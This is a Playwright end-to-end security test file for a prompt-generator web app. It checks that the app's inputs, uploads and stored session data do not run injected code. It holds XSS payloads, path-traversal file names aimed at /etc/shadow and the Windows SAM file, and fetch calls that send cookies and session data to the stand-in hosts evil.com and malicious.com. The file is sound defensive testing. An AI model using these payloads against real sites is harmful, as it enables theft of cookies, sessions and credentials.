/**
 * Security E2E Tests
 * Tests security measures in real browser environment
 */

import { test, expect } from '@playwright/test';

test.describe('Security E2E Tests', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
  });

  test('should prevent XSS attacks through user input', async ({ page }) => {
    const xssPayload = '<script>window.xssExecuted = true; alert("XSS");</script>';

    // Add XSS payload to chronology field
    await page.fill('#chronology', xssPayload);

    // Generate prompts to trigger content processing
    await page.fill('#arguments', 'test');
    await page.fill('#templateText', 'test');
    await page.click('#generateBtn');

    // Verify XSS did not execute
    const xssExecuted = await page.evaluate(() => window.xssExecuted);
    expect(xssExecuted).toBeUndefined();

    // Verify content is displayed safely
    await expect(page.locator('#claudePromptOutput')).toContainText('<script>');

    // Verify no actual script tags were injected into DOM
    const scriptTags = await page.$$('script[src*="alert"]');
    expect(scriptTags.length).toBe(0);
  });

  test('should handle malicious file uploads safely', async ({ page }) => {
    // Switch to upload tab
    await page.click('.template-tab[data-tab="upload"]');

    // Try to upload a file with malicious content
    const maliciousContent = `
      <script>
        // Malicious payload
        fetch('http://evil.com/steal?data=' + document.cookie);
        localStorage.setItem('compromised', 'true');
      </script>
      <img src="x" onerror="alert('Image XSS')">
    `;

    await page.setInputFiles('#templateFile', {
      name: 'malicious.html',
      mimeType: 'text/html',
      buffer: Buffer.from(maliciousContent)
    });

    // Should reject HTML files
    await expect(page.locator('#uploadStatus')).toContainText('Unsupported file type');

    // Try with disguised file
    await page.setInputFiles('#templateFile', {
      name: 'disguised.txt',
      mimeType: 'text/plain',
      buffer: Buffer.from(maliciousContent)
    });

    // Content should be loaded but not executed
    const compromised = await page.evaluate(() => localStorage.getItem('compromised'));
    expect(compromised).toBeNull();

    // Verify content is safely displayed
    await expect(page.locator('#templateText')).toHaveValue(maliciousContent);
  });

  test('should prevent URL injection attacks', async ({ page }) => {
    const dangerousUrls = [
      'javascript:alert("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
      'vbscript:msgbox("XSS")'
    ];

    for (const url of dangerousUrls) {
      await page.fill('#instructions', `Visit this link: ${url}`);
      await page.fill('#chronology', 'test');
      await page.fill('#arguments', 'test');
      await page.fill('#templateText', 'test');
      await page.click('#generateBtn');

      // URL should be included as text but not as executable link
      await expect(page.locator('#claudePromptOutput')).toContainText(url);

      // Verify no dangerous links were created
      const dangerousLinks = await page.$$(`a[href="${url}"]`);
      expect(dangerousLinks.length).toBe(0);
    }
  });

  test('should prevent CSS injection attacks', async ({ page }) => {
    const cssPayload = `
      <style>
        body { 
          background: url("javascript:alert('CSS XSS')"); 
          display: none;
        }
      </style>
    `;

    await page.fill('#templateText', cssPayload);
    await page.fill('#chronology', 'test');
    await page.fill('#arguments', 'test');
    await page.click('#generateBtn');

    // Verify page is still visible (CSS didn't execute)
    await expect(page.locator('body')).toBeVisible();

    // Verify no style tags were injected
    const injectedStyles = await page.$$('style:not([data-playwright])');
    const hasInjectedCSS = await Promise.all(
      injectedStyles.map(async (style) => {
        const content = await style.textContent();
        return content.includes('javascript:alert');
      })
    );
    expect(hasInjectedCSS.some(Boolean)).toBe(false);
  });

  test('should prevent event handler injection', async ({ page }) => {
    const eventHandlerPayload = `
      <div onclick="alert('Click XSS')" onmouseover="alert('Hover XSS')">
        Test content
      </div>
    `;

    await page.fill('#arguments', eventHandlerPayload);
    await page.fill('#chronology', 'test');
    await page.fill('#templateText', 'test');
    await page.click('#generateBtn');

    // Verify content is displayed
    await expect(page.locator('#claudePromptOutput')).toContainText('Test content');

    // Try to trigger event handlers (should not work)
    const outputContent = page.locator('#claudePromptOutput');
    await outputContent.hover();
    await outputContent.click();

    // Verify no alerts were triggered (Playwright would catch these)
    // If XSS worked, this test would fail
  });

  test('should sanitize copied content', async ({ page }) => {
    const maliciousContent = '<script>alert("Copied XSS")</script>';

    await page.fill('#chronology', maliciousContent);
    await page.fill('#arguments', 'test');
    await page.fill('#templateText', 'test');
    await page.click('#generateBtn');

    // Copy the generated prompt
    await page.click('#copyClaude');

    // If we could paste and it executed, that would be a security issue
    // The copy operation should include the literal text, not executable code
    const clipboardContent = await page.evaluate(async () => {
      try {
        return await navigator.clipboard.readText();
      } catch (e) {
        return 'clipboard not accessible';
      }
    });

    // Clipboard should contain the literal text
    expect(clipboardContent).toContain('<script>');
  });

  test('should prevent localStorage manipulation attacks', async ({ page }) => {
    // Try to inject malicious session data
    await page.evaluate(() => {
      localStorage.setItem('submissionsSession', JSON.stringify({
        platform: '<script>alert("Storage XSS")</script>',
        position: 'javascript:alert("Position XSS")',
        chronology: '<img src=x onerror="alert(\'Image XSS\')">'
      }));
    });

    // Load the malicious session
    await page.click('#loadSession');

    // Verify no XSS execution occurred
    const xssExecuted = await page.evaluate(() => window.xssExecuted);
    expect(xssExecuted).toBeUndefined();

    // Verify malicious content is treated as text
    const chronologyValue = await page.inputValue('#chronology');
    expect(chronologyValue).toContain('<img src=x');
  });

  test('should prevent file path traversal attacks', async ({ page }) => {
    await page.click('.template-tab[data-tab="upload"]');

    const pathTraversalNames = [
      '../../../etc/passwd',
      '..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow'
    ];

    for (const fileName of pathTraversalNames) {
      await page.setInputFiles('#templateFile', {
        name: fileName,
        mimeType: 'text/plain',
        buffer: Buffer.from('test content')
      });

      // Should process file safely without accessing actual paths
      await expect(page.locator('#templateText')).toHaveValue('test content');
    }
  });

  test('should prevent MIME type spoofing', async ({ page }) => {
    await page.click('.template-tab[data-tab="upload"]');

    // File with script extension but claiming to be text
    await page.setInputFiles('#templateFile', {
      name: 'malicious.js',
      mimeType: 'text/plain',
      buffer: Buffer.from('console.log("This should not execute");')
    });

    // Should reject based on extension despite MIME type
    await expect(page.locator('#uploadStatus')).toContainText('Unsupported file type');
  });

  test('should prevent content security policy bypasses', async ({ page }) => {
    // Try various CSP bypass techniques
    const cspBypassAttempts = [
      'data:,<script>alert("CSP Bypass")</script>',
      'blob:http://localhost/<script>alert("Blob CSP")</script>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'Meta Refresh XSS\')">'
    ];

    for (const attempt of cspBypassAttempts) {
      await page.fill('#templateText', attempt);
      await page.fill('#chronology', 'test');
      await page.fill('#arguments', 'test');
      await page.click('#generateBtn');

      // Verify content is included but not executed
      await expect(page.locator('#claudePromptOutput')).toContainText('script');
    }
  });

  test('should prevent session hijacking through XSS', async ({ page }) => {
    // Fill session with important data
    await page.fill('#chronology', 'Confidential legal matter');
    await page.fill('#arguments', 'Sensitive legal arguments');
    await page.click('#saveSession');

    // Try XSS that attempts to steal session
    const sessionStealingXSS = `
      <script>
        fetch('http://malicious.com/steal', {
          method: 'POST',
          body: localStorage.getItem('submissionsSession')
        });
      </script>
    `;

    await page.fill('#instructions', sessionStealingXSS);
    await page.fill('#templateText', 'test');
    await page.click('#generateBtn');

    // Verify session data is still safe and XSS didn't execute
    const sessionData = await page.evaluate(() =>
      localStorage.getItem('submissionsSession')
    );

    expect(sessionData).toContain('Confidential legal matter');
    // If XSS executed, session would likely be compromised or gone
  });

  test('should maintain security with rapid input changes', async ({ page }) => {
    // Rapidly change inputs with malicious content
    const maliciousInputs = [
      '<script>alert(1)</script>',
      'javascript:alert(2)',
      '<img src=x onerror=alert(3)>',
      '<svg onload=alert(4)>',
      '<iframe src="javascript:alert(5)"></iframe>'
    ];

    for (let i = 0; i < maliciousInputs.length; i++) {
      await page.fill('#chronology', maliciousInputs[i]);
      await page.waitForTimeout(100); // Brief pause to simulate real user interaction
    }

    // Generate with final malicious content
    await page.fill('#arguments', 'test');
    await page.fill('#templateText', 'test');
    await page.click('#generateBtn');

    // Verify no XSS execution occurred despite rapid changes
    const xssExecuted = await page.evaluate(() => window.xssExecuted);
    expect(xssExecuted).toBeUndefined();

    // Verify final content is safely displayed
    await expect(page.locator('#claudePromptOutput')).toContainText('<iframe');
  });
});